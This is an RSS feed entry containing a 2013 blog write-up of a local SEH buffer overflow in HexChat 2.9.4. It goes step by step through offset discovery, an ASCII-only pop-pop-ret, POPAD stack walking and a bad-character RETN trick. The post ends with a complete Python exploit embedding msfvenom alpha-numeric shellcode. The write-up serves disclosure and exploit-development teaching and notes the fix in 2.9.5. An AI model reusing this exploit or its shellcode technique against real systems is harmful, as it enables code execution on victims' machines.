<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hexchat on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/hexchat/index.xml</link>
    <description>Recent content in Hexchat on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/hexchat/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Buffer Overflow in HexChat 2.9.4</title>
      <link>https://www.mattandreko.com/blog/2013-04-06-buffer-overflow-in-hexchat-294/</link>
      <pubDate>Sat, 06 Apr 2013 14:55:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2013-04-06-buffer-overflow-in-hexchat-294/</guid>
      <description>

&lt;p&gt;A buddy of mine, &lt;a href=&#34;https://twitter.com/imulitia&#34;&gt;Mulitia&lt;/a&gt;, and I were talking about 0-days, and he mentioned finding one in Hex-Chat, a popular IRC client. It was super low severity, but still neat. If you entered &amp;ldquo;/server &amp;rdquo; followed by 20,000 random characters, the application died. I decided to try to make a working exploit out of this for fun.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;I contacted HexChat, by initialling going into the #hexchat channel on irc.freenode.net and trying to find a security contact. TingPing said I could give the details specifically through him. Eventually an issue was created: &lt;a href=&#34;https://github.com/hexchat/hexchat/issues/463&#34;&gt;https://github.com/hexchat/hexchat/issues/463&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;walkthrough-of-the-exploit&#34;&gt;Walkthrough of the exploit&lt;/h2&gt;

&lt;p&gt;This exploit was a little more complicated than many I&amp;rsquo;ve had to do previously. It has 3 stages, due to bad characters that can&amp;rsquo;t be entered in the payload (pretty much anything non-alpha-numeric).&lt;/p&gt;

&lt;h2 id=&#34;the-offset&#34;&gt;The offset&lt;/h2&gt;

&lt;p&gt;First thing&amp;rsquo;s first, when developing an exploit, you need to have the offset of the buffer so you know where to put executable statements. By using the pattern_create functionality of Mona.py, I made a 25,000 line unique string, and ran it into the program while attached to a debugger.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_pc.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I then took this long pattern, and pasted it into HexChat&amp;rsquo;s textbox, after a &amp;ldquo;/server &amp;rdquo; string:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_pattern.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once I hit enter, the debugger stated:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Access violation when writing to [00130000] - use Shift+F7/F8/F9 to pass the exception to the program&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Since an exception was raised, I checked the SEH window, to see if I had overwritten the SEH handler.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_seh.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Indeed, I had overwritten the SEH handler with &amp;ldquo;37635236&amp;rdquo;. I then ran mona&amp;rsquo;s pattern_offset to find the offset of the string that would overwrite the SEH handler.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_po.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Based on this knowledge, I knew the offset would be somewhere around 13340 bytes in. Since this was an SEH exploit, the next step was to find an instruction that did a pop-pop-ret.&lt;/p&gt;

&lt;h2 id=&#34;pop-pop-ret&#34;&gt;Pop-Pop-Ret&lt;/h2&gt;

&lt;p&gt;Finding a valid pop-pop-ret instruction became a bit difficult, because I started to find out that HexChat would pretty much only use ASCII characters. Luckily, Mona.py had me covered, and can search for filtered characters:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_mona_seh.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I went through the seh.txt file that had all the addresses, and found one that I liked:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;0x68626463 : pop ebx # pop ebp # ret | asciiprint,ascii,lower {PAGE_EXECUTE_READ} [libglib-2.0-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.26.1.0 (C:\Program Files\HexChat\libglib-2.0-0.dll)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This string was all lowercase letters, had no ASLR or SafeSEH, so it seemed like a fairly good address to use.&lt;/p&gt;

&lt;h2 id=&#34;the-jump&#34;&gt;The jump&lt;/h2&gt;

&lt;p&gt;I created a little test exploit stub so I could see the memory after the pop-pop-ret occurred. It wasn&amp;rsquo;t really anything special.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13340 . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x11656&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I pasted it into HexChat, and saw the same Access Violation. I checked the SEH window to make sure I overwrote properly:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_seh2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;You can see there, that the SEH is now pointing to the address of the pop-pop-ret. I created a breakpoint for 0x68626463 and hit Shift-F9. I hit the breakpoint, and F7 3 times to step through the pop-pop-ret.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_ppr.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Typically, in an SEH exploit, right before the PPR instruction, you&amp;rsquo;d put the next instruction that you want to execute, the nseh (more details at &lt;a href=&#34;https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/&#34;&gt;Corelan&amp;rsquo;s excellent blog&lt;/a&gt;). This instruction is typically a jump. Due to our ascii issue, I found it was possible to do a 21 byte jump, by using a conditional &amp;ldquo;JA&amp;rdquo; jump (see &lt;a href=&#34;http://www.unixwiz.net/techtips/x86-jumps.html&#34;&gt;here&lt;/a&gt; for jump details) instruction. I had to prepend 2 &amp;ldquo;DEC ESP&amp;rdquo; instructions to make the conditional jump work, by setting the proper flags. This left my exploit stub looking like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13336 . &amp;quot;\x4c\x4c\x77\x21&amp;quot; . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x11656&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;getting-more-space&#34;&gt;Getting more space&lt;/h2&gt;

&lt;p&gt;I ran the exploit stub, followed the pop-pop-ret and then the jump, and found myself in memory that I controlled. That was the good news. Unfortunately, the bad news was that I only had a very limited amount of space to put any payload (43 bytes). My first thought was to use an egghunter, however egghunters had non-ascii characters in them, and when encoded properly, were well over 43 bytes long. This left me thinking for a good while.&lt;/p&gt;

&lt;p&gt;After a couple days of thinking, I thought about using a fairly non-traditional method to exploit this. In the stack, way down, was a pointer to the beginning of the buffer I sent into HexChat. I was able to use the &lt;a href=&#34;https://en.wikipedia.org/wiki/X86_instruction_listings&#34;&gt;POPAD instruction&lt;/a&gt; to get rid of several ESP values at once, since it&amp;rsquo;s Opcode was an ASCII character. By combining 38 POPAD instructions, I was able to get to the pointer in memory, and still have 5 bytes of memory to try to load it. My exploit-stub ended up looking like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13336 . &amp;quot;\x4c\x4c\x77\x21&amp;quot; . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x29 . &amp;quot;\x61&amp;quot;x38 . &amp;quot;C&amp;quot;x11589&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I ran it through the debugger, it worked out perfectly.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_popad.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;finding-the-jump-via-corruption&#34;&gt;Finding the jump via corruption&lt;/h2&gt;

&lt;p&gt;With only 5 bytes remaining, and ASCII encoding requirements, I pondered a bit. I couldn&amp;rsquo;t see any way to get a &amp;ldquo;JMP ESP&amp;rdquo;. I found a JMP ESP in one of the loaded libraries, but I didn&amp;rsquo;t have enough space to push it into memory and then RETN. For some reason, during testing, I found that some of my non-ASCII characters were bad-characters, and would get translated to RETN statements. I thought perhaps I could use a &amp;ldquo;PUSH ESP&amp;rdquo; instruction which was ASCII, and then use a bad-character to convert into a &amp;ldquo;RETN&amp;rdquo; instruction, since it typically would not be ASCII (\xc3). It ended up working. I put a &amp;ldquo;\xE9&amp;rdquo;, and it converted it to &amp;ldquo;RETN&amp;rdquo; and then an &amp;ldquo;\x88&amp;rdquo;. Since I&amp;rsquo;d never be hitting the &amp;ldquo;\x88&amp;rdquo; I figured this would work. I tried it, and miraculously it did! Using a corrupted character actually let it jump!&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_push_esp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After taking the &amp;ldquo;RETN&amp;rdquo;, it placed me in an area with thousands of bytes for shellcode.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_push_esp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;From this point, it was just as easy as inserting some alpha-numeric encoded shellcode, and changing some lengths of junk strings.&lt;/p&gt;

&lt;h2 id=&#34;the-final-working-exploit&#34;&gt;The final working exploit&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
# HexChat 2.9.4 Local Exploit
# Bug found by Jules Carter &amp;lt; @iMulitia &amp;gt;
# Exploit by Matt &amp;quot;hostess&amp;quot; Andreko &amp;lt; mandreko [at] accuvant.com &amp;gt;
# http://www.mattandreko.com/2013/04/buffer-overflow-in-hexchat-294.html
junk1 = &amp;quot;B&amp;quot;*30
shellcode = (
# msfvenom -p windows/messagebox EXITFUNC=process BufferRegister=ESP -e x86/alpha_mixed -f c
&amp;quot;\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&amp;quot;
&amp;quot;\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b&amp;quot;
&amp;quot;\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58&amp;quot;
&amp;quot;\x50\x38\x41\x42\x75\x4a\x49\x78\x59\x68\x6b\x6d\x4b\x4b\x69&amp;quot;
&amp;quot;\x44\x34\x64\x64\x59\x64\x74\x71\x78\x52\x6c\x72\x33\x47\x34&amp;quot;
&amp;quot;\x71\x78\x49\x42\x44\x4e\x6b\x50\x71\x50\x30\x4e\x6b\x64\x36&amp;quot;
&amp;quot;\x54\x4c\x4c\x4b\x44\x36\x77\x6c\x4c\x4b\x33\x76\x77\x78\x4c&amp;quot;
&amp;quot;\x4b\x73\x4e\x51\x30\x4e\x6b\x75\x66\x56\x58\x72\x6f\x72\x38&amp;quot;
&amp;quot;\x51\x65\x68\x73\x43\x69\x37\x71\x38\x51\x39\x6f\x58\x61\x73&amp;quot;
&amp;quot;\x50\x4e\x6b\x30\x6c\x36\x44\x77\x54\x6c\x4b\x42\x65\x75\x6c&amp;quot;
&amp;quot;\x6e\x6b\x73\x64\x36\x48\x31\x68\x46\x61\x6a\x4a\x4e\x6b\x52&amp;quot;
&amp;quot;\x6a\x66\x78\x6e\x6b\x73\x6a\x57\x50\x43\x31\x7a\x4b\x6d\x33&amp;quot;
&amp;quot;\x34\x74\x42\x69\x6c\x4b\x47\x44\x4c\x4b\x67\x71\x48\x6e\x74&amp;quot;
&amp;quot;\x71\x6b\x4f\x36\x51\x79\x50\x6b\x4c\x4e\x4c\x4c\x44\x39\x50&amp;quot;
&amp;quot;\x34\x34\x75\x57\x49\x51\x4a\x6f\x36\x6d\x67\x71\x4a\x67\x5a&amp;quot;
&amp;quot;\x4b\x5a\x54\x67\x4b\x71\x6c\x61\x34\x34\x68\x32\x55\x6d\x31&amp;quot;
&amp;quot;\x6e\x6b\x33\x6a\x47\x54\x76\x61\x38\x6b\x71\x76\x4c\x4b\x64&amp;quot;
&amp;quot;\x4c\x52\x6b\x4e\x6b\x71\x4a\x67\x6c\x67\x71\x4a\x4b\x4e\x6b&amp;quot;
&amp;quot;\x74\x44\x4c\x4b\x76\x61\x69\x78\x4e\x69\x62\x64\x66\x44\x47&amp;quot;
&amp;quot;\x6c\x63\x51\x5a\x63\x6e\x52\x33\x38\x61\x39\x69\x44\x6b\x39&amp;quot;
&amp;quot;\x59\x75\x6c\x49\x58\x42\x73\x58\x4e\x6e\x72\x6e\x56\x6e\x58&amp;quot;
&amp;quot;\x6c\x62\x72\x4d\x38\x4f\x6f\x6b\x4f\x69\x6f\x69\x6f\x4f\x79&amp;quot;
&amp;quot;\x61\x55\x75\x54\x6d\x6b\x31\x6e\x4e\x38\x79\x72\x70\x73\x6f&amp;quot;
&amp;quot;\x77\x45\x4c\x45\x74\x70\x52\x39\x78\x6c\x4e\x4b\x4f\x49\x6f&amp;quot;
&amp;quot;\x59\x6f\x6f\x79\x43\x75\x55\x58\x73\x58\x62\x4c\x70\x6c\x51&amp;quot;
&amp;quot;\x30\x77\x31\x53\x58\x67\x43\x54\x72\x66\x4e\x61\x74\x71\x78&amp;quot;
&amp;quot;\x52\x55\x44\x33\x62\x45\x61\x62\x6d\x58\x51\x4c\x75\x74\x57&amp;quot;
&amp;quot;\x7a\x4c\x49\x58\x66\x73\x66\x6b\x4f\x30\x55\x47\x74\x6b\x39&amp;quot;
&amp;quot;\x4f\x32\x72\x70\x4d\x6b\x39\x38\x6d\x72\x72\x6d\x4f\x4c\x4b&amp;quot;
&amp;quot;\x37\x35\x4c\x67\x54\x30\x52\x5a\x48\x75\x31\x39\x6f\x6b\x4f&amp;quot;
&amp;quot;\x39\x6f\x33\x58\x42\x4f\x34\x38\x53\x68\x31\x30\x72\x48\x35&amp;quot;
&amp;quot;\x31\x73\x57\x61\x75\x62\x62\x35\x38\x72\x6d\x72\x45\x54\x33&amp;quot;
&amp;quot;\x62\x53\x54\x71\x69\x4b\x6f\x78\x33\x6c\x75\x74\x54\x4a\x6f&amp;quot;
&amp;quot;\x79\x78\x63\x61\x78\x72\x78\x45\x70\x77\x50\x75\x70\x70\x68&amp;quot;
&amp;quot;\x72\x6d\x50\x53\x37\x36\x77\x51\x70\x68\x43\x42\x30\x6f\x42&amp;quot;
&amp;quot;\x4d\x71\x30\x35\x38\x52\x4f\x66\x4c\x31\x30\x61\x76\x61\x78&amp;quot;
&amp;quot;\x71\x58\x50\x65\x42\x4c\x32\x4c\x55\x61\x5a\x69\x6e\x68\x72&amp;quot;
&amp;quot;\x6c\x61\x34\x44\x50\x4f\x79\x4d\x31\x56\x51\x4b\x62\x33\x62&amp;quot;
&amp;quot;\x61\x43\x46\x31\x52\x72\x39\x6f\x58\x50\x46\x51\x49\x50\x42&amp;quot;
&amp;quot;\x70\x69\x6f\x36\x35\x34\x48\x41\x41&amp;quot;
)
junk2 = &amp;quot;A&amp;quot;*(13306-len(shellcode))
stage1 = &amp;quot;\x4c\x4c\x77\x21&amp;quot; # 21 byte jump (JA)
ret = &amp;quot;\x63\x64\x62\x68&amp;quot; # ASCII PPR
junk3 = &amp;quot;C&amp;quot;*29
stage2 = &amp;quot;\x61&amp;quot;*38 # POPAD x 38
stage2 += &amp;quot;\x54&amp;quot; # PUSH ESP
stage2 += &amp;quot;\xE9&amp;quot; # RETN # This byte is a bad char, but gets converted to RETN and \x88
junk4 = &amp;quot;D&amp;quot;*11586

print &amp;quot;Copy this text, and enter into HexChat&#39;s textbox: \&amp;quot;/server [string]\&amp;quot;&amp;quot; 
print junk1 + shellcode + junk2 + stage1 + ret + junk3 + stage2 + junk4
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;demo-time&#34;&gt;Demo time!&lt;/h2&gt;

&lt;p&gt;Here is a video demo of the exploit working with a simple messagebox payload.

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;//www.youtube.com/embed/izmMjz_g-84&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
 &lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;remediation&#34;&gt;Remediation&lt;/h2&gt;

&lt;p&gt;It&amp;rsquo;s suggested that all users upgrade to 2.9.5 where this vulnerability has been fixed. HexChat is available here: &lt;a href=&#34;http://hexchat.org/downloads.html&#34;&gt;http://hexchat.org/downloads.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>